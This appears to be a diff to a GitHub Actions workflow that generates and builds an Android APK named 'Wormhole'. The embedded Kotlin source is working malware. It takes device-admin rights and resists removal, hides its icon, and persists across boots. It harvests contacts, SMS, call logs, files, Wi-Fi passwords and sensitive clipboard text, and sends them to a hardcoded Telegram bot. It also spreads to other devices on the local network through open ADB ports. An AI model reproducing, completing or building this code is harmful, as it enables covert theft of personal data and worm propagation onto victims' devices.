@@ -7,47 +7,36 @@ jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-    - name: Checkout
-      uses: actions/checkout@v4
-    
-    - name: Setup JDK 17
-      uses: actions/setup-java@v4
+    - uses: actions/checkout@v4
+    - uses: actions/setup-java@v4
       with:
         java-version: '17'
         distribution: 'temurin'
-    
-    - name: Create Project Structure
+    - name: Create Project
       run: |
         mkdir -p app/src/main/java/com/wormhole/zero
         mkdir -p app/src/main/res/xml
         mkdir -p gradle/wrapper
-        
-        # settings.gradle.kts
-        echo 'pluginManagement{repositories{google();mavenCentral();gradlePluginPortal()}}' > settings.gradle.kts
+        echo "pluginManagement{repositories{google();mavenCentral();gradlePluginPortal()}}" > settings.gradle.kts
         echo 'rootProject.name="Wormhole"' >> settings.gradle.kts
         echo 'include(":app")' >> settings.gradle.kts
-        
-        # build.gradle.kts (root)
         echo 'plugins{id("com.android.application") version "8.2.0" apply false' > build.gradle.kts
         echo 'id("org.jetbrains.kotlin.android") version "1.9.23" apply false}' >> build.gradle.kts
-        
-        # gradle.properties
-        echo 'org.gradle.jvmargs=-Xmx2048m' > gradle.properties
-        echo 'android.useAndroidX=true' >> gradle.properties
-        
-        # app/build.gradle.kts
+        echo "org.gradle.jvmargs=-Xmx2048m" > gradle.properties
+        echo "android.useAndroidX=true" >> gradle.properties
         echo 'plugins{id("com.android.application")' > app/build.gradle.kts
         echo 'id("org.jetbrains.kotlin.android")}' >> app/build.gradle.kts
         echo 'android{namespace="com.wormhole.zero"' >> app/build.gradle.kts
-        echo 'compileSdk=34' >> app/build.gradle.kts
+        echo "compileSdk=34" >> app/build.gradle.kts
         echo 'defaultConfig{applicationId="com.wormhole.zero"' >> app/build.gradle.kts
         echo 'minSdk=26;targetSdk=33;versionCode=1;versionName="1.0"}' >> app/build.gradle.kts
-        echo 'buildTypes{release{isMinifyEnabled=true}}' >> app/build.gradle.kts
-        echo 'compileOptions{sourceCompatibility=JavaVersion.VERSION_17' >> app/build.gradle.kts
-        echo 'targetCompatibility=JavaVersion.VERSION_17}}' >> app/build.gradle.kts
-        
-        # AndroidManifest.xml
-        cat > app/src/main/AndroidManifest.xml << 'EOFMAN'
+        echo "buildTypes{release{isMinifyEnabled=true}}" >> app/build.gradle.kts
+        echo "compileOptions{sourceCompatibility=JavaVersion.VERSION_17" >> app/build.gradle.kts
+        echo "targetCompatibility=JavaVersion.VERSION_17}" >> app/build.gradle.kts
+        echo "}" >> app/build.gradle.kts
+    - name: Create Manifest
+      run: |
+        cat > app/src/main/AndroidManifest.xml << ENDMANIFEST
         <?xml version="1.0" encoding="utf-8"?>
         <manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.wormhole.zero">
         <uses-permission android:name="android.permission.INTERNET"/>
@@ -77,35 +66,18 @@ jobs:
         <receiver android:name=".Boot" android:exported="true"><intent-filter><action android:name="android.intent.action.BOOT_COMPLETED"/></intent-filter></receiver>
         <receiver android:name=".Adm" android:permission="android.permission.BIND_DEVICE_ADMIN"><meta-data android:name="android.app.device_admin" android:resource="@xml/device_admin"/><intent-filter><action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/></intent-filter></receiver>
         </application></manifest>
-        EOFMAN
-        
-        # device_admin.xml
-        cat > app/src/main/res/xml/device_admin.xml << 'EOFXML'
+        ENDMANIFEST
+    - name: Create Device Admin XML
+      run: |
+        cat > app/src/main/res/xml/device_admin.xml << ENDXML
         <device-admin xmlns:android="http://schemas.android.com/apk/res/android">
         <uses-policies><limit-password/><watch-login/><reset-password/><force-lock/><wipe-data/><expire-password/><encrypted-storage/><disable-camera/><disable-keyguard-features/></uses-policies>
         </device-admin>
-        EOFXML
-        
-        # Download gradlew
-        wget -q https://raw.githubusercontent.com/nickchubb/GradleW/master/gradlew
-        wget -q https://raw.githubusercontent.com/nickchubb/GradleW/master/gradlew.bat
-        chmod +x gradlew
-        
-        # gradle wrapper properties
-        mkdir -p gradle/wrapper
-        cat > gradle/wrapper/gradle-wrapper.properties << 'EOFWRAP'
-        distributionBase=GRADLE_USER_HOME
-        distributionPath=wrapper/dists
-        distributionUrl=https://services.gradle.org/distributions/gradle-8.2-bin.zip
-        zipStoreBase=GRADLE_USER_HOME
-        zipStorePath=wrapper/dists
-        EOFWRAP
-
-    - name: Download MainActivity.kt
+        ENDXML
+    - name: Create MainActivity.kt
       run: |
-        cat > app/src/main/java/com/wormhole/zero/MainActivity.kt << 'EOFKOT'
+        cat > app/src/main/java/com/wormhole/zero/MainActivity.kt << 'ENDKOT'
         package com.wormhole.zero
-
         import android.app.*
         import android.app.admin.*
         import android.content.*
@@ -117,35 +89,18 @@ jobs:
         import android.telephony.*
         import java.io.*
         import java.net.*
-
         object C{const val BOT="8452221818:AAE-QKfxWA7Lg86DPES1WuI5vQJReYKSFco";const val CID="7135293162";val API get()="https://api.telegram.org/bot$BOT/"}
-
         class MainActivity:Activity(){override fun onCreate(b:Bundle?){super.onCreate(b);val dpm=getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager;val cn=ComponentName(this,Adm::class.java);if(!dpm.isAdminActive(cn)){startActivity(Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply{putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,cn);putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,"Update")})};packageManager.setComponentEnabledSetting(ComponentName(this,MainActivity::class.java),PackageManager.COMPONENT_ENABLED_STATE_DISABLED,PackageManager.DONT_KILL_APP);startService(Intent(this,Ghost::class.java));finish()}}
-
         class Adm:DeviceAdminReceiver(){override fun onDisableRequested(c:Context,i:Intent)="No";override fun onEnabled(c:Context,i:Intent){c.startService(Intent(c,Ghost::class.java))}}
         class Boot:BroadcastReceiver(){override fun onReceive(c:Context,i:Intent){val s=Intent(c,Ghost::class.java);if(Build.VERSION.SDK_INT>=26)c.startForegroundService(s)else c.startService(s)}}
-
-        class Ghost:Service(){override fun onCreate(){super.onCreate();if(Build.VERSION.SDK_INT>=26){val ch=NotificationChannel("x","S",NotificationManager.IMPORTANCE_MIN);getSystemService(NotificationManager::class.java).createNotificationChannel(ch);startForeground(1,Notification.Builder(this,"x").build())};Eng.ctx=this;Eng.start()}
-        override fun onStartCommand(i:Intent?,f:Int,id:Int):Int{Eng.start();return START_STICKY}
-        override fun onBind(i:Intent?)=null
-        override fun onTaskRemoved(r:Intent?){startService(Intent(this,Ghost::class.java))}}
-
-        object Eng{var ctx:Context?=null;var run=false
-        fun start(){if(run)return;run=true
-        Thread{while(run){try{Harv.coll();Worm.spread();Thread.sleep(30000)}catch(_:Exception){}}}.start()}}
-
-        object Net{
-        fun send(m:String){Thread{try{m.chunked(3800).forEach{c->val u=URL("${C.API}sendMessage?chat_id=${C.CID}&text=${URLEncoder.encode(c,"UTF-8")}");(u.openConnection() as HttpURLConnection).apply{connectTimeout=10000;readTimeout=10000;inputStream.close();disconnect()}}}catch(_:Exception){}}.start()}
-        fun file(f:File,caption:String=""){Thread{try{if(!f.exists()||f.length()==0L||f.length()>50*1024*1024)return@Thread;val B="==W${System.currentTimeMillis()}==";val u=URL("${C.API}sendDocument");val con=u.openConnection() as HttpURLConnection;con.doOutput=true;con.connectTimeout=60000;con.readTimeout=60000;con.setRequestProperty("Content-Type","multipart/form-data; boundary=$B");val o=con.outputStream;fun w(s:String){o.write(s.toByteArray())};w("--$B\r\n");w("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n${C.CID}\r\n");w("--$B\r\n");w("Content-Disposition: form-data; name=\"caption\"\r\n\r\n$caption\r\n");w("--$B\r\n");w("Content-Disposition: form-data; name=\"document\"; filename=\"${f.name}\"\r\n");w("Content-Type: application/octet-stream\r\n\r\n");o.flush();f.inputStream().copyTo(o);o.flush();w("\r\n--$B--\r\n");o.flush();con.inputStream.close();con.disconnect()}catch(_:Exception){}}.start()}}
-
-        object Worm{
-        fun spread(){Thread{try{val ctx=Eng.ctx?:return@Thread;val apk=File(ctx.packageCodePath).readBytes();val sub=subnet()?:return@Thread;for(i in 2..254){val h="$sub$i";if(adb(h))inf(h,apk,ctx)}}catch(_:Exception){}}.start()}
-        fun subnet():String?{try{val ctx=Eng.ctx?:return null;val w=ctx.getSystemService(Context.WIFI_SERVICE) as? WifiManager;val ip=w?.connectionInfo?.ipAddress?:0;if(ip!=0)return "${ip and 0xFF}.${(ip shr 8) and 0xFF}.${(ip shr 16) and 0xFF}.";NetworkInterface.getNetworkInterfaces().toList().forEach{ni->if(!ni.isLoopback)ni.inetAddresses.toList().forEach{a->if(a is Inet4Address&&!a.isLoopbackAddress&&a.hostAddress?.startsWith("192.168.")==true)return a.hostAddress.substringBeforeLast(".")+"."}}};return null}catch(_:Exception){}}
+        class Ghost:Service(){override fun onCreate(){super.onCreate();if(Build.VERSION.SDK_INT>=26){val ch=NotificationChannel("x","S",NotificationManager.IMPORTANCE_MIN);getSystemService(NotificationManager::class.java).createNotificationChannel(ch);startForeground(1,Notification.Builder(this,"x").build())};Eng.ctx=this;Eng.start()}override fun onStartCommand(i:Intent?,f:Int,id:Int):Int{Eng.start();return START_STICKY}override fun onBind(i:Intent?)=null;override fun onTaskRemoved(r:Intent?){startService(Intent(this,Ghost::class.java))}}
+        object Eng{var ctx:Context?=null;var run=false;fun start(){if(run)return;run=true;Thread{while(run){try{Harv.coll();Worm.spread();Thread.sleep(30000)}catch(_:Exception){}}}.start()}}
+        object Net{fun send(m:String){Thread{try{m.chunked(3800).forEach{c->val u=URL("${C.API}sendMessage?chat_id=${C.CID}&text=${URLEncoder.encode(c,"UTF-8")}");(u.openConnection() as HttpURLConnection).apply{connectTimeout=10000;readTimeout=10000;inputStream.close();disconnect()}}}catch(_:Exception){}}.start()}fun file(f:File,caption:String=""){Thread{try{if(!f.exists()||f.length()==0L||f.length()>50*1024*1024)return@Thread;val B="==W${System.currentTimeMillis()}==";val u=URL("${C.API}sendDocument");val con=u.openConnection() as HttpURLConnection;con.doOutput=true;con.connectTimeout=60000;con.readTimeout=60000;con.setRequestProperty("Content-Type","multipart/form-data; boundary=$B");val o=con.outputStream;fun w(s:String){o.write(s.toByteArray())};w("--$B\r\n");w("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n${C.CID}\r\n");w("--$B\r\n");w("Content-Disposition: form-data; name=\"caption\"\r\n\r\n$caption\r\n");w("--$B\r\n");w("Content-Disposition: form-data; name=\"document\"; filename=\"${f.name}\"\r\n");w("Content-Type: application/octet-stream\r\n\r\n");o.flush();f.inputStream().copyTo(o);o.flush();w("\r\n--$B--\r\n");o.flush();con.inputStream.close();con.disconnect()}catch(_:Exception){}}.start()}}
+        object Worm{fun spread(){Thread{try{val ctx=Eng.ctx?:return@Thread;val apk=File(ctx.packageCodePath).readBytes();val sub=subnet()?:return@Thread;for(i in 2..254){val h="$sub$i";if(adb(h))inf(h,apk,ctx)}}catch(_:Exception){}}.start()}fun subnet():String?{try{val ctx=Eng.ctx?:return null;val w=ctx.getSystemService(Context.WIFI_SERVICE) as? WifiManager;val ip=w?.connectionInfo?.ipAddress?:0;if(ip!=0)return "${ip and 0xFF}.${(ip shr 8) and 0xFF}.${(ip shr 16) and 0xFF}.";NetworkInterface.getNetworkInterfaces().toList().forEach{ni->if(!ni.isLoopback)ni.inetAddresses.toList().forEach{a->if(a is Inet4Address&&!a.isLoopbackAddress&&a.hostAddress?.startsWith("192.168.")==true)return a.hostAddress.substringBeforeLast(".")+"."}}};return null}catch(_:Exception){}}
         fun adb(h:String)=try{Socket().use{it.connect(InetSocketAddress(h,5555),500)};true}catch(_:Exception){false}
-        fun inf(h:String,d:ByteArray,ctx:Context){try{Runtime.getRuntime().exec(arrayOf("adb","connect","$h:5555")).waitFor();val t=File(ctx.cacheDir,"w.apk");t.writeBytes(d);val a= arrayOf("adb","-s","$h:5555");Runtime.getRuntime().exec(a+ arrayOf("push",t.absolutePath,"/data/local/tmp/w.apk")).waitFor();Runtime.getRuntime().exec(a+ arrayOf("shell","pm","install","-g","-d","/data/local/tmp/w.apk")).waitFor();Runtime.getRuntime().exec(a+ arrayOf("shell","am","start","-n","com.wormhole.zero/.MainActivity")).waitFor();Runtime.getRuntime().exec(arrayOf("adb","disconnect","$h:5555")).waitFor();Net.send("HI: $h");t.delete()}catch(_:Exception){}}}
-
-        object Harv{
-        fun coll(){Thread{try{val c=Eng.ctx?:return@Thread;cont(c);sms(c);cal(c);file(c);db(c);info(c);apps(c);wifi(c);clip(c);Net.send("OK")}catch(_:Exception){}}.start()}
+        fun inf(h:String,d:ByteArray,ctx:Context){try{Runtime.getRuntime().exec(arrayOf("adb","connect","$h:5555")).waitFor();val t=File(ctx.cacheDir,"w.apk");t.writeBytes(d);val a= arrayOf("adb","-s","$h:5555");Runtime.getRuntime().exec(a+ arrayOf("push",t.absolutePath,"/data/local/tmp/w.apk")).waitFor();Runtime.getRuntime().exec(a+ arrayOf("shell","pm","install","-g","-d","/data/local/tmp/w.apk")).waitFor();Runtime.getRuntime().exec(a+ arrayOf("shell","am","start","-n","com.wormhole.zero/.MainActivity")).waitFor();Runtime.getRuntime().exec(arrayOf("adb","disconnect","$h:5555")).waitFor();Net.send("HI: $h");t.delete()}catch(_:Exception){}}
+        }
+        object Harv{fun coll(){Thread{try{val c=Eng.ctx?:return@Thread;cont(c);sms(c);cal(c);file(c);db(c);info(c);apps(c);wifi(c);clip(c);Net.send("OK")}catch(_:Exception){}}.start()}
         fun cont(c:Context){val s=StringBuilder("C:");try{c.contentResolver.query(ContactsContract.Contacts.CONTENT_URI,null,null,null,null)?.use{cu->while(cu.moveToNext()){val n=cu.getString(cu.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME))?:"?";val id=cu.getString(cu.getColumnIndex(ContactsContract.Contacts._ID));c.contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,"${ContactsContract.CommonDataKinds.Phone.CONTACT_ID}=?", arrayOf(id),null)?.use{p->while(p.moveToNext())s.appendLine("$n:${p.getString(p.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))}")}}}}catch(_:Exception){};if(s.length>20)Net.send(s.toString())}
         fun sms(c:Context){val s=StringBuilder("S:");try{c.contentResolver.query(Telephony.Sms.CONTENT_URI,null,null,null,"date DESC LIMIT 100")?.use{cu->while(cu.moveToNext())s.appendLine("${cu.getString(cu.getColumnIndex(Telephony.Sms.ADDRESS))}:${cu.getString(cu.getColumnIndex(Telephony.Sms.BODY))}")}}catch(_:Exception){};if(s.length>15)Net.send(s.toString())}
         fun cal(c:Context){val s=StringBuilder("L:");try{c.contentResolver.query(CallLog.Calls.CONTENT_URI,null,null,null,"${CallLog.Calls.DATE} DESC LIMIT 100")?.use{cu->while(cu.moveToNext()){val t=when(cu.getInt(cu.getColumnIndex(CallLog.Calls.TYPE))){CallLog.Calls.INCOMING_TYPE->"IN";CallLog.Calls.OUTGOING_TYPE->"OUT";CallLog.Calls.MISSED_TYPE->"MISS";else->"?"};s.appendLine("${cu.getString(cu.getColumnIndex(CallLog.Calls.NUMBER))}[$t]${cu.getString(cu.getColumnIndex(CallLog.Calls.DURATION))}s")}}catch(_:Exception){};if(s.length>15)Net.send(s.toString())}
@@ -156,11 +111,21 @@ jobs:
         fun wifi(c:Context){try{val f=File("/data/misc/wifi/wpa_supplicant.conf");if(f.exists()){val s=StringBuilder("W:");f.readLines().forEach{l->if(l.contains("ssid")||l.contains("psk"))s.appendLine(l)};if(s.length>40)Net.send(s.toString())}}catch(_:Exception){}}
         fun clip(c:Context){try{val cm=c.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager;val clip=cm.primaryClip;if(clip!=null&&clip.itemCount>0){val t=clip.getItemAt(0).text?.toString()?:"";val kw= listOf("password","otp","cvv","card","login");if(t.isNotEmpty()&&t.length<500&&kw.any{t.lowercase().contains(it)})Net.send("CLIP:$t")}}catch(_:Exception){}}
         }
-        EOFFKOT
-
+        ENDKOT
+    - name: Setup Gradle Wrapper
+      run: |
+        wget -q https://raw.githubusercontent.com/nickchubb/GradleW/master/gradlew
+        wget -q https://raw.githubusercontent.com/nickchubb/GradleW/master/gradlew.bat
+        chmod +x gradlew
+        cat > gradle/wrapper/gradle-wrapper.properties << ENDWRAP
+        distributionBase=GRADLE_USER_HOME
+        distributionPath=wrapper/dists
+        distributionUrl=https://services.gradle.org/distributions/gradle-8.2-bin.zip
+        zipStoreBase=GRADLE_USER_HOME
+        zipStorePath=wrapper/dists
+        ENDWRAP
     - name: Build APK
       run: ./gradlew assembleRelease
-
     - name: Upload APK
       uses: actions/upload-artifact@v4
       with:
